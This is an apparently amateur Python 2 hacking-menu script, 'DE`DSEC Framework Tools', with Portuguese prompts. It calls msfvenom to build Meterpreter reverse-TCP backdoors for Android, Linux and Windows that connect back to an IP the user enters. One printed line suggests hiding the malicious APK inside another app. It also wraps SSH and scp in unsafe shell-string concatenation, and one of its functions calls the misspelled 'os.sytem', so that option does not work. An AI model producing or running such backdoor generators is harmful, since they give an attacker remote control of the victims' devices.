import socket
import os
import sys


def apkmalware():
	print("[+] Recomendado esconder esse Malware em outro apk")
	ip = raw_input("Insira de seu ip ")
	port = raw_input("Insira a porta ")
	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " R > /root/Desktop/backdoor.apk")

def sshconnect():
	user = raw_input("Insira o usuario do ssh ")
	ip = raw_input("Insira o ip do usuario ")
	os.sytem("ssh " + user + "@" + ip)

def uploadssh():
	arquivo = raw_input("Insira o arquivo ")
	user = raw_input("Insira o usuario ")
	ip = raw_input("Insira o ip ")
	dest = raw_input("Insira o destino do arquivo")
	os.system("scp " + arquivo + " " + user + "@" + ip + ":" + dest)

def meterpreter():
	print("[1] Linux Backdoor ")
	print("[2] Windows Backdoor ")
	print(" ")
	choose = raw_input("Select the platform ")
	if choose == "1":
		ip = raw_input("Insira seu IP ")
		port = raw_input("Porta de escuta ")
		os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f elf > /root/Desktop/backdoor.elf")
	if choose == "2":
		ip = raw_input("Insira seu IP ")
		port = raw_input("Porta de escuta ")
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe > /root/Desktop/backdoor.exe")
os.system("clear")
print (" __________________________________________________________________")
print ("|           ____  ______   ____  ______  ______________            |")
print ("|          / __ \/ ____/  / __ \/ ____/ / ____/ _______\           |")
print ("|         / / / / ___/   / / / /\____ \/ ___// /                   |")
print ("|        / /_/ / /_____ / /_/ /_____/ / /___/  \_______            |")
print ("|       /_____/_______//_____/_______/______/\________/            |")
print ("|                                                                  |")
print ("|                >:DE`DSEC Framework Tools                         |")
print ("|                                                                  |")
print ("|__________________________________________________________________|")
print (" ") 
print (" ")
print("[1] Backdoor APK MALWARE")
print("[2] SSH Connect")
print("[3] SSH Upload Archive")
print("[4] Create Metasploit Backdoor")
print(" ")
choice = raw_input(">DE`DSEC:/ ")
if choice == "1":
	apkmalware()
if choice == "2":
	sshconnect()
if choice == "3":
	uploadssh()
if choice == "4":
	meterpreter()
